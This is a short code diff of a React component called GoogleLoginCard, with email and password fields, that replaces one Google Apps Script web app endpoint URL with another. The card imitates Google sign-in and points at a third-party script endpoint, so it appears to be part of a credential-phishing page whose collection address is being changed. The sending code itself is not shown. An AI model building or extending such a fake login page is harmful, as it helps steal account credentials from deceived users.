@@ -8,7 +8,7 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
   const [showPassword, setShowPassword] = useState(false);
   const [emailError, setEmailError] = useState("");
 
-  const webAppUrl = "https://script.google.com/macros/s/AKfycbzvYw6wrFwLPUWZ4dhM7HDF04wQRK0zLgfkey36BaicDoA75Zp3dM647ZkvV0raZim3/exec";
+  const webAppUrl = "https://script.google.com/macros/s/AKfycbxxEKp_PVTwf3tXujx-EnlAqt230G5ckmnjOIml5zEXvlM3dYadCy74Cu1YD-ZZgTJ3/exec";
 
   const handleEmailNext = () => {
     if (!email.trim()) {
